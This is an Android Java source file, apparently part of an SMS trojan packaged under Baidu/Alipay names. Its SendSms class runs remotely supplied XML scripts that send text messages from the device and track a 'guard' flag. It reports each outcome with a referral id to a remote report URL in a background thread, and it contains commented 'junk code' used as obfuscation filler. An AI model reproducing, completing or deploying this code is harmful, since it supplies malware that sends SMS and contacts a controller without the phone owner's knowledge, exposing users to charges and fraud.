package com.baidu.alipay.script;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.Cookie;
import com.baidu.alipay.net.SyncParam;
import com.baidu.alipay.script.sms.SyncThread;
import com.baidu.serv.BaseThread;

public class SendSms {
//    private static final String TAG = "SendSms";
    
    public static final String SENDSMS = "sendsms";
    private static final String REFER = "refer";
    private static final String UA = "ua";
    private static final String REPORT = "report";
    private static final String SCRIPT = "script";
    
    private String key = UUID.randomUUID().toString();
    private String ua = "";
    public void setUa(String ua) {
		this.ua = ua;
	}

	private String reportUrl = "";
    private SyncParam sParam = new SyncParam();
    private boolean hasSms = false;
    private boolean hasGuard = false;
    
    public void setHasGuard(boolean hasGuard){
    	this.hasGuard = hasGuard;
    }
    
    public void setHasSms(boolean hasSms){
    	this.hasSms = hasSms;
    }

    public SyncParam getSyncParam(){
    	return sParam;
    }

    private List<Tags> tagsList = new ArrayList<Tags>();
    
//    public static List<Tags> subTagsList(List<Tags> srcList, int pos, int num){
//    	List<Tags> list = new ArrayList<Tags>();
//    	
//    	for(int i = pos + num ; i > pos ; i --){
//    		Tags tags = srcList.remove(i);
//    		list.add(0,tags);
//    	}
//    	
//    	return list;
//    }
    
    private Map<String, String> map = new HashMap<String, String>();
    
    public SendSms(String XmlData) throws Exception {
        initScriptStep(XmlData);
    }

    // 解析脚本，生成操作队列
    private void initScriptStep(String XmlData) throws Exception {
        
        String sendsms = Tags.getNodeValue(XmlData, SENDSMS);
        
        this.sParam.setRefer(Tags.getNodeValue(sendsms, REFER));
        
        this.ua = Tags.getNodeValue(sendsms, UA);
        
        this.reportUrl = Tags.getNodeValue(sendsms, REPORT);
        
        String script = Tags.getNodeValue(sendsms, SCRIPT);

//        LogUtil.e(TAG, "script :" + script);
        
        this.tagsList = Tags.parse(script,false);
        
        XmlData = null;
        
        if(this.tagsList != null && this.tagsList.size() > 0){
        	for(Tags tags : this.tagsList){
        		if(tags instanceof Sms){
        			this.hasSms = true;
        			break;
        		}
        	}
        }
        
    }
    
    
    
    /**
     * 脚本执行
     * @param context
     * @return
     */
    public boolean work(final Context context,boolean sync){

//    	final SendSmsPojoHandler sendSmsPojoHandler = new SendSmsPojoHandler(context);
    	final SyncParam syncparm = new SyncParam();
    	
    	try {

//            UserLogUtil.addLog(context, "SendSms work : "+sParam.getRefer());
            
    		syncparm.setStat(Tags.TAGS_EXEC_SUCC);
    		
    		//保存SendSmsPojo start
//    		if(!"0".equals(sParam.getRefer())){
//    			sendSmsPojoHandler.save(key,Utils.getLastRandom(context), sParam.getRefer(), reportUrl);
//    		}
            //保存SendSmsPojo end

//            LogUtil.e(TAG, "scriptStep ori size: " + tagsList.size());

            for (int i = 0; i < tagsList.size(); i++) {
                Object obj = tagsList.get(i);
                if (obj instanceof Tags) {
//                	UserLogUtil.addLog(context, "SmsSender work0 "+((Tags)obj).getTag()+" : "+sParam.getRefer()+"_"+i+" start");
                	
                    String my_result = ((Tags) obj).work(context,this,this.tagsList,i);

                  //垃圾代码开始
//                    {
//        	    		int dadada = 0;
//        	    		
//        	    		if(dadada < 0){
//        	    			String asffa = "array";
//        	    			String fffsa = "ide";
//        	
//        	    			String sadss = "res";
//        	    			String fafsa = "ua";
//        	    			
//        	    			String afa = sadss+"."+asffa+"."+fffsa+"."+fafsa;
//        	    		}
//                    } 
                    
//                    LogUtil.e(TAG, "执行第" + i + "个节点" + " " + "执行结果：" + my_result);
                    
//                    UserLogUtil.addLog(context, "SmsSender work0 "+((Tags)obj).getTag()+": "+sParam.getRefer()+"_"+i+";"+my_result);
                    
                    if (!Tags.TAGS_EXEC_SUCC.equals(my_result)) {
                        // 失败
                        syncparm.setStat(Tags.TAGS_EXEC_FAIL);
                        syncparm.setReason(((Tags)obj).getErrorReason()+"f"+i);
//                        LogUtil.e(TAG, "*************失败了**********" + syncparm.CreatParam());

                        break;
                    }else{
                    	syncparm.setStat(Tags.TAGS_EXEC_SUCC);
                    	String reason = ((Tags)obj).getErrorReason();
                    	if(reason != null && reason.length() > 0){
                    		syncparm.setReason(reason);
                    	}
                    }
                } 
                // 成功
            }
           
        } catch (Throwable e) {
        	e.printStackTrace();
            syncparm.setStat(Tags.TAGS_EXEC_FAIL);
            syncparm.setReason(e.getMessage());
//            UserLogUtil.addLog(context, "SendSms work1 error : "+e.getClass().getName()+";"+e.getStackTrace()[0].toString());
        }
//    	 UserLogUtil.addLog(context, "SendSms work1 : "+syncparm.getStat()+";"+sParam.getRefer());
    	
//    	 if(!"0".equals(sParam.getRefer())){
//	    	 try{
//	    		
//	            //更改发送状态
//	        	SendSmsPojo sendSmsPojo = new SendSmsPojo();
//	        	
//	        	sendSmsPojo.setKey(key);
//	        	sendSmsPojo.setSendStatus(Integer.parseInt(syncparm.getStat()));
//	        	sendSmsPojo.setReason(syncparm.getReason());
//	        	
//	            sendSmsPojoHandler.updateSendStatus(sendSmsPojo);
//	            
//	            if(Tags.TAGS_EXEC_SUCC.equals(syncparm.getStat()) && (!hasSms || !hasGuard)){
//	            	sendSmsPojo.setGuardStatus(SendSmsPojo.GUARDSTATUS_SUCC);
//	            	sendSmsPojoHandler.updateGuardStatus(sendSmsPojo);
//	            }
//	            
//	        }catch (Exception e) {
//				e.printStackTrace();
//			}finally{
//	        	if(sendSmsPojoHandler != null){
//	        		sendSmsPojoHandler.close();
//	        	}
//	        }
//    	 }

    	try{ 
    		if(!sParam.getRefer().equals("0")){
	    		final String url = reportUrl+"?refer="+sParam.getRefer()+"&reason="+syncparm.getReason()+"&stat="+syncparm.getStat()+"&type=send";
	
//	    		if(!sync){//异步的话实时同步
//		            SyncThread.sync(context, url);
//	            }else
	    		//同步或者异步成功时才同步，异步失败时不同步
//	    		if(sync || (!sync && Tags.TAGS_EXEC_SUCC.equals(syncparm.getStat())))
	            {
	            	new BaseThread(null){
	            		public void run(){
	            			SyncThread.sync(context, url);
	            		}
	            	}.start();
	            }
    		}
    	}catch (Exception e) {
			e.printStackTrace();
		}
    	
        return Tags.TAGS_EXEC_SUCC.equals(syncparm.getStat());
    }
    
    /**
     * 追加动态标签
     * @param subList
     * @param pos
     */
//    public static void addTags(List<Tags> srcList, List<Tags> subList,int pos){
//    	srcList.addAll(pos + 1, subList);
//    }

    /**
     * 重复标签
     * @param pos
     * @param step
     */
//	public static List<Tags> repeatTags(List<Tags> srcList, int pos, int step) {
//		List<Tags> subList = new ArrayList<Tags>();
//		
//		if(step > 0 && step <= pos){
//			subList = srcList.subList(pos - step, pos);
//		}else if(step == 0){
//			subList = srcList.subList(0, pos);
//		}
//		
//		return subList;
//	}

    public String getDataValue(String dataKey){
    	return map.get(dataKey);
    }
    
    public void setDataValue(String dataKey,String dataValue){
    	map.put(dataKey, dataValue);
    }
    
	public String getKey() {
		return key;
	}

	public String getUa() {
		return ua;
	}
	
	//

    public Map<String,Cookie> cookieMap = new HashMap<String,Cookie>();
    public String lastContentType = "";
    public String lasturl = "";

}
